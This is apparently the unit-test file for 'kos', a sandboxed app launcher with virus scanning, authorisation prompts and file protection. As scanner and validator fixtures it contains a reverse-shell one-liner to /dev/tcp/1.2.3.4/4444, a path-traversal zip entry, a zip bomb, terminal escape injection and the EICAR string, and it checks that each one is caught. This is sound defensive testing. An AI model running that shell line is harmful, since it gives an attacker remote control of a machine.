"""Run with: python3 -m unittest discover -s tests -v"""

import io
import json
import os
import socket
import sys
import tempfile
import threading
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from kos import loader  # noqa: E402
from kos.auth import Authority, AuthorizationDenied, KdfParams, PasswordStore, Throttle  # noqa: E402
from kos.cellagent import serve  # noqa: E402
from kos.cells import CellSpec, qemu_argv, send_app  # noqa: E402
from kos.devices import INPUT_EVENT, EvdevTranslator, ScriptedDevices  # noqa: E402
from kos.display import Framebuffer, GraphicalSurface, HeadlessBackend, parse_color  # noqa: E402
from kos.kapp import KApp, KAppError, pack  # noqa: E402
from kos.paths import Paths  # noqa: E402
from kos.prompt import ScriptedPrompter  # noqa: E402
from kos.protocol import Channel, ProtocolError, validate_app_message  # noqa: E402
from kos.sandbox import SandboxPolicy  # noqa: E402
from kos.session import Session  # noqa: E402
from kos.store import AppStore, TamperedError  # noqa: E402
from kos.term import KeyParser  # noqa: E402
from kos.vfs import VFS, VFSError  # noqa: E402
from kos.registry import Instance, Registry  # noqa: E402
from kos.broker import spawn  # noqa: E402
from kos.cmdsurface import CmdSurface  # noqa: E402
from kos.protocol import validate_app_message as _vam  # noqa: E402
from kos.scan import EICAR, scan_bytes  # noqa: E402
from kos.permit import PermitError, PermitStore  # noqa: E402
from kos.optimize import optimize  # noqa: E402
from kos import cache as kcache  # noqa: E402
from kos.store import VirusFoundError  # noqa: E402
from kos.watch import Watcher, WatchRegistry, spawn_background  # noqa: E402
from kos.protect import ProtectError, ProtectStore, held_unlock  # noqa: E402
from kos.control import ControlError, build_click, parse_args  # noqa: E402
from kos import cli as kcli  # noqa: E402

PW = "correct horse battery"
EXAMPLE = Path(__file__).resolve().parent.parent / "examples" / "hello"


class Env(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        os.chmod(self.tmp.name, 0o755)
        self.paths = Paths(Path(self.tmp.name))
        PasswordStore(self.paths).create(PW.encode(), KdfParams.fresh(n=2**10), throttle_base=0)
        self.kapp = Path(self.tmp.name) / "hello.kapp"
        pack(EXAMPLE, self.kapp)

    def tearDown(self):
        self.tmp.cleanup()

    def authority(self, *answers):
        self.prompter = ScriptedPrompter(answers)
        return Authority(self.paths, self.prompter, Throttle(self.paths, base=0))


class TestAuth(Env):
    def test_grant_is_bound_to_action(self):
        g = self.authority(PW).authorize("app.run", "hello")
        g.check("app.run", "hello")
        with self.assertRaises(AuthorizationDenied):
            g.check("app.install", "hello")
        g.close()
        with self.assertRaises(AuthorizationDenied):
            g.key("x")

    def test_wrong_password_denied_and_audited(self):
        a = self.authority("nope", "nope", "nope")
        with self.assertRaises(AuthorizationDenied):
            a.authorize("device.mouse", "hello")
        self.assertEqual([e["outcome"] for e in a.audit.entries()][-1], "denied")

    def test_unknown_action_refused(self):
        with self.assertRaises(AuthorizationDenied):
            self.authority().authorize("do.anything")


class TestKApp(Env):
    def zip_with(self, files):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            for n, d in files.items():
                z.writestr(n, d)
        return b.getvalue()

    def test_rejects_traversal_and_bad_manifest(self):
        m = json.dumps({"name": "x", "version": "1", "runtime": "python", "entry": "a"})
        with self.assertRaises(KAppError):
            KApp(self.zip_with({"manifest.json": m, "../evil": "x", "a.py": ""}))
        with self.assertRaises(KAppError):
            KApp(self.zip_with({"manifest.json": m.replace('"x"', '"graphical"'), "a.py": ""}))

    def test_rejects_zip_bomb(self):
        m = json.dumps({"name": "x", "version": "1", "runtime": "python", "entry": "a"})
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("manifest.json", m)
            z.writestr("a.py", "")
            z.writestr("bomb", b"\0" * (50 << 20))
        with self.assertRaises(KAppError):
            KApp(b.getvalue())


class TestStore(Env):
    def test_install_keeps_zip_and_detects_tamper(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        stored = self.paths.apps / "hello.kapp"
        self.assertEqual(stored.read_bytes(), self.kapp.read_bytes())  # never unzipped
        with self.authority(PW).authorize("app.run", "hello") as g:
            store.load_verified("hello", g)
        data = bytearray(stored.read_bytes())
        data[-30] ^= 1
        stored.write_bytes(bytes(data))
        with self.authority(PW).authorize("app.run", "hello") as g:
            with self.assertRaises(TamperedError):
                store.load_verified("hello", g)


    def test_update_requires_newer_version(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        src = Path(self.tmp.name) / "src"
        import shutil
        shutil.copytree(EXAMPLE, src)
        m = json.loads((src / "manifest.json").read_text())
        m["version"] = "0.9"
        (src / "manifest.json").write_text(json.dumps(m))
        pack(src, Path(self.tmp.name) / "old.kapp")
        with self.assertRaises(KAppError):
            store.update(Path(self.tmp.name) / "old.kapp", self.authority())
        m["version"] = "1.10"
        (src / "manifest.json").write_text(json.dumps(m))
        pack(src, Path(self.tmp.name) / "new.kapp")
        old, new = store.update(Path(self.tmp.name) / "new.kapp", self.authority(PW))
        self.assertEqual((old, new.version), ("1.0", "1.10"))
        with self.authority(PW).authorize("app.run", "hello") as g:
            self.assertEqual(store.load_verified("hello", g).manifest.version, "1.10")


class TestProtocol(unittest.TestCase):
    def test_escape_injection_stripped(self):
        m = validate_app_message({"cmd": "screen", "title": "\x1b]0;pwn\x07hi",
                                  "lines": ["a\x1b[2Jb"]}, "tui")
        self.assertEqual(m["title"], "]0;pwnhi")
        self.assertNotIn("\x1b", m["lines"][0])

    def test_mode_enforced(self):
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": []}, "tui")
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": [["rect", 0, 0, 1, 1, "red"]]},
                                 "graphical")


class TestDisplayAndInput(unittest.TestCase):
    def test_rect_and_text(self):
        fb = Framebuffer(20, 10)
        fb.rect(2, 2, 3, 3, parse_color("#ff0000"))
        self.assertEqual(fb.pixel(3, 3), (255, 0, 0))
        self.assertEqual(fb.pixel(6, 6), (0, 0, 0))
        fb.text(0, 0, "I", parse_color("#00ff00"))
        self.assertEqual(fb.pixel(2, 1), (0, 255, 0))

    def test_key_parser(self):
        ev = KeyParser().feed(b"a\x1b[A\r\x03\x1b[<0;5;3M")
        self.assertEqual([e.get("key", e["type"]) for e in ev],
                         ["a", "up", "enter", "interrupt", "button"])
        self.assertEqual((ev[-1]["x"], ev[-1]["y"]), (4, 2))

    def test_evdev_translate(self):
        tr = EvdevTranslator(100, 100)
        raw = (INPUT_EVENT.pack(0, 0, 2, 0, 5) + INPUT_EVENT.pack(0, 0, 0, 0, 0)
               + INPUT_EVENT.pack(0, 0, 1, 0x110, 1) + INPUT_EVENT.pack(0, 0, 1, 30, 1))
        ev = tr.feed(raw)
        self.assertEqual(ev[0], {"type": "pointer", "x": 55, "y": 50})
        self.assertEqual(ev[1]["button"], "left")
        self.assertEqual(ev[2], {"type": "key", "key": "a"})


class TestSandboxedRun(Env):
    def test_session_boots_devices_with_password(self):
        """Full flow: app launched from zip in RAM; mouse and keyboard only
        reach the app after 'y' + password in the trusted prompt."""
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        with self.authority(PW).authorize("app.graphical", "hello") as g:
            app = store.load_verified("hello", g)
        a, b = socket.socketpair()
        proc = loader.launch(loader.plan(app, b.fileno(), "graphical"), SandboxPolicy(), None)
        b.close()
        devices = ScriptedDevices()
        backend = HeadlessBackend(120, 80)
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = Session(name="hello", mode="graphical", channel=Channel(a), proc=proc,
                    surface=GraphicalSurface(backend), devices=devices, authority=auth)
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        # A key before the keyboard is booted must NOT reach the app.
        devices.push({"type": "key", "key": "Z"})
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # mouse
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # keyboard
        devices.push({"type": "button", "button": "left", "pressed": True, "x": 50, "y": 60},
                     *keys("ok"))
        threading.Timer(4.0, lambda: devices.push({"type": "key", "key": "escape"})).start()
        code = s.run(first_frame_timeout=5)
        self.assertEqual(code, 0)
        self.assertEqual(devices.booted, ["mouse", "keyboard"])
        last = backend.frames[-1]
        self.assertEqual(last.pixel(49, 60), (255, 80, 128))  # the click drew a dot (OS cursor covers 50,60)
        outcomes = [(e["action"], e["outcome"]) for e in auth.audit.entries()]
        self.assertIn(("device.mouse", "granted"), outcomes)
        self.assertIn(("device.keyboard", "granted"), outcomes)

    def test_cell_agent_runs_app(self):
        app = KApp(self.kapp.read_bytes())
        path = os.path.join(self.tmp.name, "agent.sock")
        lst = socket.socket(socket.AF_UNIX)
        lst.bind(path)
        lst.listen(1)
        t = threading.Thread(target=serve, args=(lst,), kwargs={"once": True})
        t.start()
        c = socket.socket(socket.AF_UNIX)
        c.connect(path)
        send_app(c, app, "tui")
        c.sendall(b'{"cmd":"hello","mode":"tui","width":80,"height":20}\n')
        msg = json.loads(c.makefile().readline())
        self.assertEqual(msg["cmd"], "screen")
        c.sendall(b'{"cmd":"quit"}\n')
        c.close()
        t.join(10)

    def test_qemu_argv_pins_cores(self):
        argv = qemu_argv(CellSpec("web", "/k", "/i", cpus=[2, 3], cid=5), "/log")
        self.assertEqual(argv[:3], ["taskset", "-c", "2,3"])
        self.assertIn("vhost-vsock-device,guest-cid=5", argv)


class TestVFS(Env):
    def test_cd_into_zip_without_extracting(self):
        vfs = VFS(self.tmp.name)
        vfs.cd("hello.kapp")
        names = {e.name for e in vfs.list()}
        self.assertIn("manifest.json", names)
        self.assertIn("app.py", names)
        data = vfs.read_bytes("manifest.json")
        self.assertIn(b'"hello"', data)
        self.assertFalse(Path(self.tmp.name, "manifest.json").exists())  # never extracted
        vfs.up()
        self.assertEqual(vfs.pwd(), self.tmp.name)

    def test_bad_moves_rejected(self):
        vfs = VFS(self.tmp.name)
        with self.assertRaises(VFSError):
            vfs.cd("does-not-exist")
        with self.assertRaises(VFSError):
            vfs.up()  # already at the top


class TestCmdMode(unittest.TestCase):
    def test_screen_and_frame_rejected_in_cmd_mode(self):
        with self.assertRaises(Exception):
            _vam({"cmd": "screen", "title": "x", "lines": []}, "cmd")
        with self.assertRaises(Exception):
            _vam({"cmd": "frame", "ops": []}, "cmd")
        self.assertEqual(_vam({"cmd": "log", "msg": "hi"}, "cmd"), {"cmd": "log", "msg": "hi"})

    def test_cmd_surface_echoes_commands(self):
        r, w = os.pipe()
        surface = CmdSurface(w, 80, 24, "hello")
        surface.emit(">", {"cmd": "key", "key": "a"})
        surface.emit("<", {"cmd": "log", "msg": "got it"})
        os.close(w)
        with os.fdopen(r) as rf:
            out = rf.read()
        self.assertIn('> {"cmd":"key","key":"a"}', out)
        self.assertIn('< {"cmd":"log","msg":"got it"}', out)


def _alive_pid(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False


class TestOpenAttachClose(Env):
    """The `open`/`ps`/`attach`/`close` lifecycle, exercised in cmd mode so
    no real terminal is needed: `open` launches the app in the background
    under a broker, `attach` drives it, Ctrl-C detaches (app keeps running),
    `close` actually stops it."""

    def _open(self, mode="cmd"):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        action = "app.graphical" if mode == "graphical" else "app.open"
        with self.authority(PW).authorize(action, "hello") as grant:
            app = store.load_verified("hello", grant)
        registry = Registry(self.paths)
        inst_id = registry.new_id("hello")
        inst = Instance(id=inst_id, name="hello", mode=mode, broker_pid=0,
                        sock_path=str(self.paths.state / "instances" / f"{inst_id}.sock"),
                        log_path=str(self.paths.logs / f"{inst_id}.log"), started=0)
        spawn(inst, app, mode, SandboxPolicy(), registry, Path(inst.log_path))
        return registry, inst_id

    def _wait_running(self, registry, inst_id, timeout=5):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                return insts[inst_id]
            time.sleep(0.05)
        raise AssertionError("instance never reached 'running'")

    def test_open_ps_attach_detach_close(self):
        registry, inst_id = self._open("cmd")
        inst = self._wait_running(registry, inst_id)
        self.assertTrue(inst.app_pid)
        self.assertEqual([i.id for i in registry.list()], [inst_id])

        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(inst.sock_path)
        from kos.devices import ScriptedDevices
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        devices = ScriptedDevices()
        r_fd, w_fd = os.pipe()
        cmdsurface = CmdSurface(w_fd, 80, 24, "hello")
        s = Session(name="hello", mode="cmd", channel=Channel(sock), proc=None,
                    surface=cmdsurface, devices=devices, authority=auth,
                    detach_on_interrupt=True)
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # mouse
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # keyboard
        devices.push({"type": "button", "button": "left", "pressed": True, "x": 1, "y": 1})
        devices.push({"type": "interrupt"})  # Ctrl-C: must DETACH, not kill the app
        code = s.run(first_frame_timeout=0.2)
        os.close(w_fd)
        self.assertEqual(code, 0)
        self.assertTrue(s.detached)
        with os.fdopen(r_fd) as rf:
            log = rf.read()
        self.assertIn('"cmd":"button"', log)   # our click really reached the app
        self.assertIn('"cmd":"log"', log)      # and the app really answered

        # still running after detach
        self.assertEqual(registry.get(inst_id).status, "running")
        self.assertTrue(_alive_pid(registry.get(inst_id).broker_pid))

        # close actually stops it
        import signal
        import time
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)
        for _ in range(50):
            if not (self.paths.state / "instances" / f"{inst_id}.json").exists():
                break
            time.sleep(0.1)
        self.assertFalse((self.paths.state / "instances" / f"{inst_id}.json").exists())
        self.assertFalse(os.path.exists(inst.sock_path))

    def test_two_opens_are_independent(self):
        registry, id1 = self._open("cmd")
        registry, id2 = self._open("cmd")
        self._wait_running(registry, id1)
        self._wait_running(registry, id2)
        ids = {i.id for i in registry.list()}
        self.assertEqual(ids, {id1, id2})
        import signal
        import time
        os.kill(registry.get(id1).broker_pid, signal.SIGTERM)
        os.kill(registry.get(id2).broker_pid, signal.SIGTERM)
        for _ in range(50):
            if not registry.list():
                break
            time.sleep(0.1)
        self.assertEqual(registry.list(), [])


class TestActivity(Env):
    def test_feed_merges_open_apps_and_audit(self):
        from kos.activity import build_feed, render_feed
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        registry, inst_id = TestOpenAttachClose._open(self, "cmd")
        self._wait_running_local(registry, inst_id)
        items = build_feed(self.paths)
        texts = [i.text for i in items]
        self.assertTrue(any("hello" in t and "open" in t for t in texts))
        self.assertTrue(any("app.install" in t for t in texts))
        self.assertIn("hello", render_feed(items))
        import signal
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)

    def _wait_running_local(self, registry, inst_id, timeout=5):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                return
            time.sleep(0.05)
        raise AssertionError("instance never reached 'running'")


class TestScan(unittest.TestCase):
    def test_eicar_flagged_clean_file_passes(self):
        self.assertFalse(scan_bytes(EICAR, "eicar").clean)
        self.assertTrue(scan_bytes(b"print('hello')", "hello.py").clean)

    def test_recurses_into_zip_without_extracting(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", "{}")
            z.writestr("payload.bin", EICAR)
        result = scan_bytes(buf.getvalue(), "evil.kapp")
        self.assertFalse(result.clean)
        self.assertTrue(any("payload.bin" in f.path for f in result.findings))

    def test_reverse_shell_pattern_detected(self):
        r = scan_bytes(b"os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')", "x.py")
        self.assertFalse(r.clean)
        self.assertEqual(r.findings[0].rule, "reverse-shell")


class TestInstallScanning(Env):
    def test_flagged_app_is_quarantined_not_installed(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", json.dumps(
                {"name": "evil", "version": "1", "runtime": "python", "entry": "a"}))
            z.writestr("a.py", "def main():\n    pass\n# " + EICAR.decode())
        bad = Path(self.tmp.name) / "evil.kapp"
        bad.write_bytes(buf.getvalue())
        store = AppStore(self.paths)
        with self.assertRaises(VirusFoundError):
            store.install(bad, self.authority(PW))
        self.assertNotIn("evil", [a.name for a in store.installed()])
        quarantined = list((self.paths.state / "quarantine").glob("*.kapp"))
        self.assertEqual(len(quarantined), 1)
        # no password was ever spent on it: nothing was asked
        self.assertEqual(self.prompter.asked, [])

    def test_clean_app_still_installs(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        self.assertIn("hello", [a.name for a in store.installed()])


class TestPermit(Env):
    def test_grant_revoke_require(self):
        p = PermitStore(self.paths)
        with self.assertRaises(PermitError):
            p.require("hello")
        p.grant("hello")
        p.require("hello")  # no raise
        self.assertEqual([x.name for x in p.list()], ["hello"])
        p.revoke("hello")
        with self.assertRaises(PermitError):
            p.require("hello")

    def test_permit_gate_blocks_run_before_any_password_prompt(self):
        """PermitStore.require() runs before _authority() in cmd_run/cmd_open,
        so an unpermitted app is refused without ever touching a TTY."""
        import os as _os
        old_root = _os.environ.get("KOS_ROOT")
        _os.environ["KOS_ROOT"] = str(self.paths.root)
        try:
            code = kcli.main(["run", "hello"])
        finally:
            if old_root is None:
                _os.environ.pop("KOS_ROOT", None)
            else:
                _os.environ["KOS_ROOT"] = old_root
        self.assertEqual(code, 2)


class TestOptimize(Env):
    def test_recompress_shrinks_and_reseals(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        kapp_path = self.paths.apps / "hello.kapp"
        # re-store it uncompressed so there is guaranteed slack to reclaim
        import zipfile as _zf
        data = kapp_path.read_bytes()
        buf = io.BytesIO()
        with _zf.ZipFile(io.BytesIO(data)) as src, _zf.ZipFile(buf, "w", _zf.ZIP_STORED) as dst:
            for info in src.infolist():
                dst.writestr(info.filename, src.read(info.filename))
        kapp_path.write_bytes(buf.getvalue())

        report = optimize(self.paths, self.authority(PW))
        self.assertGreaterEqual(report.apps_recompressed, 1)
        self.assertGreater(report.bytes_reclaimed, 0)

        # still verifies after being recompressed and re-sealed
        with self.authority(PW).authorize("app.run", "hello") as g:
            app = store.load_verified("hello", g)
        self.assertEqual(app.manifest.name, "hello")

    def test_prunes_dead_registry_entries(self):
        from kos.registry import Instance, Registry
        registry = Registry(self.paths)
        registry.write(Instance(id="dead-1", name="hello", mode="cmd", broker_pid=999999999,
                                sock_path="/nonexistent", log_path="/nonexistent", started=0))
        report = optimize(self.paths, self.authority(PW))
        self.assertEqual(report.dead_instances_pruned, 1)
        self.assertEqual(registry.list(), [])


class TestCache(unittest.TestCase):
    def test_wipe_removes_contents_and_directory(self):
        with tempfile.TemporaryDirectory() as base:
            paths = Paths(Path(base))
            d = kcache.alloc(paths, "hello")
            (d / "secret.txt").write_text("do not persist me")
            (d / "sub").mkdir()
            (d / "sub" / "more.txt").write_text("nor me")
            self.assertTrue(d.exists())
            kcache.wipe(d)
            self.assertFalse(d.exists())

    def test_wipe_of_missing_dir_is_a_noop(self):
        kcache.wipe(Path("/nonexistent/definitely/not/here"))  # must not raise


class TestWatcher(unittest.TestCase):
    def test_detects_a_write_and_the_scanner_flags_it(self):
        from kos.scan import scan_file
        with tempfile.TemporaryDirectory() as d:
            w = Watcher([d])
            (Path(d) / "payload.bin").write_bytes(EICAR)
            import time
            time.sleep(0.2)
            events = w.read_events()
            w.close()
            self.assertTrue(any(e.endswith("payload.bin") for e in events))
            result = scan_file(Path(events[0]))
            self.assertFalse(result.clean)
            self.assertEqual(result.findings[0].rule, "eicar-test-file")


class TestProtect(Env):
    def test_protecting_locks_and_blocks_a_nonroot_writer(self):
        target = Path(self.tmp.name) / "vault"
        target.mkdir()
        store = ProtectStore(self.paths)
        store.protect(str(target), self.authority(PW))
        self.assertTrue(store.is_protected(str(target)))
        # The owning process here is root (test harness), which ignores mode
        # bits entirely, so assert on the mode itself - that's what a real,
        # non-root KOS owner process is actually stopped by (verified by
        # hand against a real non-root user during development).
        self.assertEqual(oct(target.stat().st_mode)[-3:], "500")

    def test_held_unlock_unlocks_then_relocks_even_on_error(self):
        target = Path(self.tmp.name) / "vault2"
        target.mkdir()
        store = ProtectStore(self.paths)
        store.protect(str(target), self.authority(PW))
        try:
            with held_unlock(str(target), protected=True):
                self.assertEqual(oct(target.stat().st_mode)[-3:], "700")
                raise RuntimeError("boom")
        except RuntimeError:
            pass
        self.assertEqual(oct(target.stat().st_mode)[-3:], "500")

    def test_unprotect_removes_from_list_and_unlocks(self):
        target = Path(self.tmp.name) / "vault3"
        target.mkdir()
        store = ProtectStore(self.paths)
        store.protect(str(target), self.authority(PW))
        store.unprotect(str(target), self.authority(PW))
        self.assertFalse(store.is_protected(str(target)))
        self.assertEqual(oct(target.stat().st_mode)[-3:], "700")

    def test_wrong_password_does_not_protect(self):
        target = Path(self.tmp.name) / "vault4"
        target.mkdir()
        with self.assertRaises(AuthorizationDenied):
            ProtectStore(self.paths).protect(str(target), self.authority("wrong", "wrong", "wrong"))
        self.assertFalse(ProtectStore(self.paths).is_protected(str(target)))


class TestControl(unittest.TestCase):
    def test_keyboard_words_become_attach_plus_key_events(self):
        cmds = parse_args("keyboard", ["h", "i", "enter"])
        self.assertEqual(cmds[0], {"cmd": "device", "device": "keyboard", "state": "attached"})
        self.assertEqual([c["key"] for c in cmds[1:]], ["h", "i", "enter"])

    def test_mouse_click_becomes_press_then_release(self):
        cmds = parse_args("mouse", ["click", "left", "10", "20"])
        self.assertEqual(cmds[0]["cmd"], "device")
        self.assertEqual(cmds[1], build_click("left", 10, 20, pressed=True))
        self.assertEqual(cmds[2], build_click("left", 10, 20, pressed=False))

    def test_rejects_bad_input(self):
        with self.assertRaises(ControlError):
            parse_args("mouse", ["click", "left", "999999", "0"])
        with self.assertRaises(ControlError):
            parse_args("keyboard", ["not-a-real-key-name"])
        with self.assertRaises(ControlError):
            parse_args("joystick", ["x"])


class TestControlEndToEnd(Env):
    def test_control_reaches_the_running_app_through_the_broker(self):
        """kos control sends the exact same wire commands a real boot+click
        would - verified here by sending one straight through the broker's
        socket to a real running instance and reading the app's reply."""
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        action = "app.open"
        with self.authority(PW).authorize(action, "hello") as grant:
            app = store.load_verified("hello", grant)
        registry = Registry(self.paths)
        inst_id = registry.new_id("hello")
        inst = Instance(id=inst_id, name="hello", mode="cmd", broker_pid=0,
                        sock_path=str(self.paths.state / "instances" / f"{inst_id}.sock"),
                        log_path=str(self.paths.logs / f"{inst_id}.log"), started=0)
        spawn(inst, app, "cmd", SandboxPolicy(), registry, Path(inst.log_path))
        deadline = __import__("time").monotonic() + 5
        while __import__("time").monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                inst = insts[inst_id]
                break
            __import__("time").sleep(0.05)

        # kos control's own send() connects, writes, and disconnects (fire-and-
        # forget, matching a real device's input - see the broker's single-
        # attach-slot note in ARCHITECTURE.md). To see the app's reply here,
        # send over one held-open connection instead, the same commands
        # kos control would build.
        import socket as _socket, json as _json
        commands = parse_args("mouse", ["click", "left", "5", "5"])
        sock = _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM)
        sock.connect(inst.sock_path)
        sock.settimeout(3)
        for cmd in commands:
            sock.sendall(_json.dumps(cmd, separators=(",", ":")).encode() + b"\n")
        got = b""
        try:
            while b'"cmd":"log"' not in got:
                got += sock.recv(4096)
        except OSError:
            pass
        sock.close()
        self.assertIn(b'"clicks=1', got)

        import signal
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)

    def test_control_does_not_evict_a_live_attach(self):
        """The fix: kos control has its own door into the broker now, so it
        no longer takes over the one attach slot a real terminal is using."""
        from kos.control import send as control_send

        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        with self.authority(PW).authorize("app.open", "hello") as grant:
            app = store.load_verified("hello", grant)
        registry = Registry(self.paths)
        inst_id = registry.new_id("hello")
        inst = Instance(id=inst_id, name="hello", mode="cmd", broker_pid=0,
                        sock_path=str(self.paths.state / "instances" / f"{inst_id}.sock"),
                        log_path=str(self.paths.logs / f"{inst_id}.log"), started=0)
        spawn(inst, app, "cmd", SandboxPolicy(), registry, Path(inst.log_path))
        deadline = __import__("time").monotonic() + 5
        while __import__("time").monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                inst = insts[inst_id]
                break
            __import__("time").sleep(0.05)

        # a real attach, held open
        attach = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        attach.connect(inst.sock_path)
        attach.settimeout(3)

        # a control command, through the separate control door
        commands = parse_args("keyboard", ["h"])
        control_send(inst.sock_path, commands)

        # the attach connection must still be alive and see the app's reply
        # to the control command (proving it reached the app), not be reset
        got = b""
        try:
            while b'"cmd":"log"' not in got:
                got += attach.recv(4096)
        except OSError:
            self.fail("the attach connection was closed - control evicted it")
        attach.close()
        self.assertIn(b"typed='h'", got)

        import signal
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)


class TestMv(Env):
    def _args(self, src, dst):
        import argparse
        return argparse.Namespace(src=str(src), dst=str(dst))

    def test_declining_move_changes_nothing(self):
        from unittest.mock import patch
        src = Path(self.tmp.name) / "a.txt"
        src.write_text("hi")
        dst = Path(self.tmp.name) / "b.txt"
        fake = self.authority("wrong", "wrong", "wrong")
        with patch("kos.cli._authority", return_value=(fake, fake.prompter)):
            with self.assertRaises(AuthorizationDenied):
                kcli.cmd_mv(self._args(src, dst), self.paths)
        self.assertTrue(src.exists())
        self.assertFalse(dst.exists())

    def test_declining_optimize_step_leaves_the_move_done(self):
        from unittest.mock import patch
        src = Path(self.tmp.name) / "a.txt"
        src.write_text("hi")
        dst = Path(self.tmp.name) / "b.txt"
        # step 1 (move) succeeds, step 2 (optimize) fails 3x and raises
        fake = self.authority(PW, "wrong", "wrong", "wrong")
        with patch("kos.cli._authority", return_value=(fake, fake.prompter)):
            with self.assertRaises(AuthorizationDenied):
                kcli.cmd_mv(self._args(src, dst), self.paths)
        self.assertFalse(src.exists())
        self.assertTrue(dst.exists())  # the move already happened; not undone

    def test_full_pipeline_one_password_per_step(self):
        from unittest.mock import patch
        src = Path(self.tmp.name) / "a.txt"
        src.write_text("hello world, nothing dangerous here")
        dst = Path(self.tmp.name) / "b.txt"
        fake = self.authority(PW, PW, PW)  # exactly one per step, no more
        with patch("kos.cli._authority", return_value=(fake, fake.prompter)):
            code = kcli.cmd_mv(self._args(src, dst), self.paths)
        self.assertEqual(code, 0)
        self.assertFalse(src.exists())
        self.assertTrue(dst.exists())
        self.assertEqual(dst.read_text(), "hello world, nothing dangerous here")

    def test_moves_a_whole_directory_and_scans_every_file_in_it(self):
        """Confirms a backlog item ('kos mv for whole directories') was
        already covered: os.replace/shutil.move handle a directory tree as
        one unit, and the scan step already walks a directory recursively."""
        from unittest.mock import patch
        src = Path(self.tmp.name) / "proj"
        (src / "sub").mkdir(parents=True)
        (src / "a.txt").write_text("clean file one")
        (src / "sub" / "b.txt").write_text("clean file two")
        dst = Path(self.tmp.name) / "proj-moved"
        fake = self.authority(PW, PW, PW)
        with patch("kos.cli._authority", return_value=(fake, fake.prompter)):
            code = kcli.cmd_mv(self._args(src, dst), self.paths)
        self.assertEqual(code, 0)
        self.assertFalse(src.exists())
        self.assertTrue((dst / "a.txt").exists())
        self.assertTrue((dst / "sub" / "b.txt").exists())


class TestBackgroundWatch(Env):
    def _wait(self, cond, timeout=5):
        deadline = __import__("time").monotonic() + timeout
        while __import__("time").monotonic() < deadline:
            if cond():
                return
            __import__("time").sleep(0.05)
        raise AssertionError("condition never became true")

    def test_background_watch_scans_and_quarantines(self):
        registry = WatchRegistry(self.paths)
        watchdir = Path(self.tmp.name) / "w"
        watchdir.mkdir()
        job = spawn_background([str(watchdir)], [], self.paths, self.paths.logs / "w.log")
        self._wait(lambda: any(j.id == job.id and j.status == "running"
                               for j in registry.list()))

        (watchdir / "evil.bin").write_bytes(EICAR)
        self._wait(lambda: not (watchdir / "evil.bin").exists())
        quarantined = list((self.paths.state / "quarantine").glob("evil.bin-*"))
        self.assertEqual(len(quarantined), 1)

        import signal
        os.kill(job.pid, signal.SIGTERM)
        self._wait(lambda: not (self.paths.state / "watchjobs" / f"{job.id}.json").exists())

    def test_background_watch_unlocks_and_relocks_a_protected_dir(self):
        registry = WatchRegistry(self.paths)
        target = Path(self.tmp.name) / "vault"
        target.mkdir()
        ProtectStore(self.paths).protect(str(target), self.authority(PW))
        self.assertEqual(oct(target.stat().st_mode)[-3:], "500")

        job = spawn_background([str(target)], [str(target)], self.paths,
                               self.paths.logs / "v.log")
        self._wait(lambda: any(j.id == job.id and j.status == "running"
                               for j in registry.list()))
        self.assertEqual(oct(target.stat().st_mode)[-3:], "700")

        import signal
        os.kill(job.pid, signal.SIGTERM)
        self._wait(lambda: not (self.paths.state / "watchjobs" / f"{job.id}.json").exists())
        self.assertEqual(oct(target.stat().st_mode)[-3:], "500")


if __name__ == "__main__":
    unittest.main()
